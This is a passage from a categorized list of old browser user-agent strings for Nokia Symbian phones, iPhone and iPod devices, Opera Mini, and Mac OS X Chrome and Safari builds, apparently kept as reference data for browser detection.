		Nokia6260/2.0 (3.0436.5ch) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		Nokia6260/2.0 (3.0452.0ch) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		Nokia6260/2.0 (5.0536.1ch) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		Nokia6670/2.0 (4.0437.4ch) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		Nokia6670/2.0 (4.0441.0ch) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		Nokia6670/2.0 (4.0445.0ch) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		Nokia6670/2.0 (5.0509.0ch) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		Nokia6670/2.0 (6.0525.0ch) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		Nokia7610/2.0 (4.0421.4ch) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		Nokia7610/2.0 (4.0424.4ch) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		Nokia7610/2.0 (4.0437.4ch) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		Nokia7610/2.0 (4.0441.0ch) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		Nokia7610/2.0 (4.0445.0ch) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		Nokia7610/2.0 (5.0509.0ch) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		Nokia7610/2.0 (6.0525.0ch) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0

		SymbianOS 8.*: 
		Nokia6681/2.0 (3.10.6) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia6681/2.0 (3.20.3) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia6681/2.0 (4.00.15) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia6681/2.0 (5.37.01) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia6630/1.0 (2.39.15) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia6630/1.0 (2.3.129) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia6680/1.0 (3.04.37) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia6630/1.0 (3.45.110) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1 
		Nokia6630/1.0 (3.45.113) SymbianOS/8.0 Series60/2.6 Profile/MIDP-2.0 Configuration/CLDC-1.1

		SymbianOS 9.*: 
		Mozilla/5.0 (SymbianOS/9.1; U; de) AppleWebKit/413 (KHTML, like Gecko) Safari/413 
		Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413 
		Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413 es50 
		Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413 es65 
		Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413 es70 
		Mozilla/5.0 (SymbianOS/9.1; U; [en]; SymbianOS/91 Series60/3.0) AppleWebkit/413 (KHTML, like Gecko) Safari/413 
		Mozilla/5.0 (SymbianOS/9.1; U; [en]; Series60/3.0 NokiaE60/4.06.0) AppleWebKit/413 (KHTML, like Gecko) Safari/413 
		Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 Nokia5700/3.27; Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413 
		Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 Nokia6120c/3.70; Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413 
		Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95/10.0.018; Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413 
		Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95/10.0.018; Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413 UP.Link/6.3.0.0.0 
		Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaE90-1/07.24.0.3; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413 UP.Link/6.2.3.18.0 
		Mozilla/5.0 (SymbianOS/9.3; U; Series60/3.2 NokiaE75-1/110.48.125 Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413 
		Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba 
		Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE5-00.2/071.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.26 Mobile Safari/533.4 3gpp-gba 
		Mozilla/5.0 (SymbianOS/9.4; U; Series60/5.0 Nokia5800d-1/21.0.025; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413 
		Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-1/10.0.012; Profile/MIDP-2.1 Configuration/CLDC-1.1; en-us) AppleWebKit/525 (KHTML, like Gecko) WicKed/7.1.12344 
		Mozilla/5.0 (SymbianOS/9.4; U; Series60/5.0 SonyEricssonP100/01; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 Safari/525 
		Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-1/12.0.024; Profile/MIDP-2.1 Configuration/CLDC-1.1; en-us) AppleWebKit/525 (KHTML, like Gecko) BrowserNG/7.1.12344 
		Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaC6-00/20.0.042; Profile/MIDP-2.1 Configuration/CLDC-1.1; zh-hk) AppleWebKit/525 (KHTML, like Gecko) BrowserNG/7.2.6.9 3gpp-gba 
		SamsungI8910/SymbianOS/9.1 Series60/3.0 
		NokiaN97i/SymbianOS/9.1 Series60/3.0 
		NokiaE52-1/SymbianOS/9.1 Series60/3.0 3gpp-gba 
		NokiaE5-00/SymbianOS/9.1 Series60/3.0 3gpp-gba 
		NokiaC7-00/SymbianOS/9.1 Series60/3.0 3gpp-gba 
		NokiaC5-00/061.005 (SymbianOS/9.3; U; Series60/3.2 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 Safari/525 3gpp-gba 
		NokiaN97/21.1.107 (SymbianOS/9.4; Series60/5.0 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebkit/525 (KHTML, like Gecko) BrowserNG/7.1.4 
		Nokia5250/11.0.008 (SymbianOS/9.4; U; Series60/5.0 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Safari/525 3gpp-gba 
		Nokia5250/10.0.011 (SymbianOS/9.4; U; Series60/5.0 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Safari/525 3gpp-gba 
		Mozilla/5.0 (SymbianOS 9.4; Series60/5.0 NokiaN97-1/10.0.012; Profile/MIDP-2.1 Configuration/CLDC-1.1; en-us) AppleWebKit/525 (KHTML, like Gecko) WicKed/7.1.12344 
		NokiaC6-00/10.0.021 (SymbianOS/9.4; Series60/5.0 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebkit/525 (KHTML, like Gecko) BrowserNG/7.2.6 UNTRUSTED/1.0 3gpp-gba


		iPhone OS:

		iPhone OS 2_*: 
		Mozilla/5.0 (iPhone; U; CPU iPhone OS 2_0 like Mac OS X; en-us) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5A347 Safari/525.200 
		Mozilla/5.0 (iPhone; U; CPU iPhone OS 2_0 like Mac OS X; ja-jp) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5A347 Safari/52 
		Mozilla/5.0 (iPhone; U; CPU iPhone OS 2_0 like Mac OS X; ja-jp) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5A345 Safari/525.20 
		Mozilla/5.0 (iPhone; U; CPU iPhone OS 2_0_1 like Mac OS X; ja-jp) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5B108 Safari/525.20 
		Mozilla/5.0 (iPod; U; CPU iPhone OS 2_1 like Mac OS X; ja-jp) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5F137 Safari/525.20 
		Mozilla/5.0 (iPhone; U; CPU iPhone OS 2_1 like Mac OS X; ja-jp) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5F136 Safari/525.20 
		Mozilla/5.0 (iPod; U; CPU iPhone OS 2_2_1 like Mac OS X; en-us) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5H11a Safari/525.20

		iPhone OS 3_*: 
		Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16 
		Mozilla/5.0 (iPod; U; CPU iPhone OS 3_1_1 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Mobile/7C145 
		Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_1_3 like Mac OS X; ja-jp) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7E18 Safari/528.16 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/23.411; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/23.377; U; en) Presto/2.5.25 Version/10.54

		iPhone OS 4_*: 
		Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8A293 Safari/531.22.7 
		Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0_1 like Mac OS X; ja-jp) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8A306 Safari/6531.22.7 
		Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0_2 like Mac OS X; ja-jp) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8A400 Safari/6531.22.7 
		Mozilla/5.0 (iPod; U; CPU iPhone OS 4_1 like Mac OS X; ja-jp) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8B118 Safari/6531.22.7 
		Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_1 like Mac OS X; ja-jp) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8B117 Safari/6531.22.7 
		Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; ja-jp) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5 
		Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; da-dk) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5 
		Mozilla/5.0 (iPod; U; CPU iPhone OS 4_2_1 like Mac OS X; ja-jp) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5 
		Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; ja-jp) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5 
		Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; de-de) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8F190 
		Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_1 like Mac OS X; ja-jp) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5 
		Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_2 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8H7 Safari/6533.18.5 
		Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; ja-jp) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5 
		Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_4 like Mac OS X; ja-jp) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8K2 Safari/6533.18.5 
		Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_5 like Mac OS X; ja-jp) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1 
		Mozilla/5.0 (iPod; U; CPU iPhone OS 4_3_5 like Mac OS X; ja-jp) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.3.24214; iPhone; CPU iPhone OS 4_2_1 like Mac OS X; AppleWebKit/24.783; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (iPhone; U; fr; CPU iPhone OS 4_2_1 like Mac OS X; fr) AppleWebKit/23.405; U; en) Presto/2.5.25 Version/10.54

		iPhone 5_*: 
		Mozilla/5.0 (iPhone; U; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A334 Safari/7534.48.3 
		Mozilla/5.0 (iPhone; CPU iPhone OS 5_0_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9A405 Safari/7534.48.3 
		Mozilla/5.0 (iPod; CPU iPhone OS 5_0_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A405 Safari/7534.48.3 
		Mozilla/5.0 (iPhone; U; CPU iPhone OS 5_1_1 like Mac OS X; da-dk) AppleWebKit/534.46.0 (KHTML, like Gecko) CriOS/19.0.1084.60 Mobile/9B206 Safari/7534.48.3

		iPhone(others): 
		Mozilla/5.0 (iPhone; U; CPU like Mac OS X; en) AppleWebKit/420 (KHTML, like Gecko) Version/3.0 Mobile/1A543a Safari/419.3 
		Mozilla/5.0 (iPhone; U; CPU iPhone OS) (compatible; Googlebot-Mobile/2.1; http://www.google.com/bot.html) 
		Mozilla/5.0 (iPhone; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1C28 Safari/419.3 
		Mozilla/5.0 (Windows; U; Windows CE; Mobile; like iPhone; ko-kr) AppleWebKit/533.3 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.3 Dorothy 
		Opera/9.80 (J2ME/MIDP; Opera Mini/9 (Compatible; MSIE:9.0; iPhone; BlackBerry9700; AppleWebKit/24.746; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (iPhone; Opera Mini/7.1.32694/27.1407; U; en) Presto/2.8.119 Version/11.10 
		Opera/9.80 (iPhone; Opera Mini/7.0.4/28.2555; U; fr) Presto/2.8.119 Version/11.10 
		Opera/9.80 (J2ME/iPhone;Opera Mini/5.0.019802/886; U; ja)Presto/2.4.15 
		Opera/9.80 (J2ME/iPhone;Opera Mini/5.0.019802/886; U; ja)Presto/ 2.4.15 
		Opera/9.80 (J2ME/iPhone;Opera Mini/5.0.019802/886; U; ja) Presto/2.4.15 
		Opera/9.80 (iPhone; Opera Mini/5.0.019802/886; U; ja) Presto/2.4.15 
		Opera/9.80 (iPhone; Opera Mini/5.0.019802/886; U; en) Presto/2.4.15 
		Opera/9.80 (iPhone; Opera Mini/5.0.019802/22.414; U; de) Presto/2.5.25 Version/10.54 
		Opera/9.80 (iPhone; Opera Mini/5.0.019802/18.738; U; en) Presto/2.4.15 
		Opera/9.80 (iPhone; Opera Mini/5.0.0176/764; U; en) Presto/2.4.154.15 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (iPhone; U; xxxx like Mac OS X; en) AppleWebKit/24.838; U; en) Presto/2.5.25 Version/10.54


		Mac OS X:

		Mac OS X 10_5*: 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-US) AppleWebKit/530.9 (KHTML, like Gecko) Chrome/ Safari/530.9 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-US) AppleWebKit/530.6 (KHTML, like Gecko) Chrome/ Safari/530.6 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/ Safari/530.5 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-US) AppleWebKit/528.16 (KHTML, like Gecko, Safari/528.16) OmniWeb/v622.8.0 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7;en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.212.1 Safari/532.1 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198 Safari/532.0 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.196 Safari/532.0 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-US) AppleWebKit/531.3 (KHTML, like Gecko) Chrome/3.0.192 Safari/531.3 
		Mozilla/5.0 (Macintosh; U; Mac OS X 10_5_7; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/ Safari/530.5 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.127 Safari/534.16 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.224 Safari/534.10 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/534.2 (KHTML, like Gecko) Chrome/6.0.453.1 Safari/534.2 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/534.1 (KHTML, like Gecko) Chrome/6.0.422.0 Safari/534.1 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.343.0 Safari/533.2 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.5 Safari/532.2 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.2 Safari/532.2 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.8 Safari/532.2 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.2 Safari/532.0 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.210.0 Safari/532.0 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.208.0 Safari/532.0 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.0 Safari/532.0 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.198 Safari/532.0 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.197 Safari/532.0 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.302.2 Safari/532.8 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.151 Safari/535.19 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.803.0 Safari/535.1 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.801.0 Safari/535.1 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/534.31 (KHTML, like Gecko) Chrome/13.0.748.0 Safari/534.31 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_8) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.68 Safari/534.24

		Mac OS X 10_6*: 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_0) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.79 Safari/537.4 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.206.1 Safari/532.0 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.204.0 Safari/532.0 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.4 Safari/532.0 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.0 Safari/532.0 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.202.0 Safari/532.0 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_0; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.212.1 Safari/532.1 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_0; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_0; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.86 Safari/533.4 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_0; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.307.11 Safari/532.9 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_0; en-US) AppleWebKit/528.10 (KHTML, like Gecko) Chrome/2.0.157.2 Safari/528.10 
		Mozilla/5.0 (Macintosh; U; Mac OS X 10_6_1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/ Safari/530.5 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.222.4 Safari/532.2 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.8 Safari/532.2 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.212.0 Safari/532.0 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.211.2 Safari/532.0 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.209.0 Safari/532.0 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.86 Safari/533.4 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.472.63 Safari/534.3 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41 Safari/535.1 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.107 Safari/535.1 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.366.0 Safari/533.4 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.343.0 Safari/533.2 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-US) AppleWebKit/530.6 (KHTML, like Gecko) Chrome/2.0.174.0 Safari/530.6 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.70 Safari/533.4 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-us) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_3) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41 Safari/535.1 
		Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_3) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.32 Safari/535.1 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.55 Safari/533.4 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.456.0 Safari/534.3 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-US) AppleWebKit/534.2 (KHTML, like Gecko) Chrome/6.0.453.1 Safari/534.2 
		Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-US) AppleWebKit/534.1 (KHTML, like Gecko) Chrome/6.0.428.0 Safari/534.1 
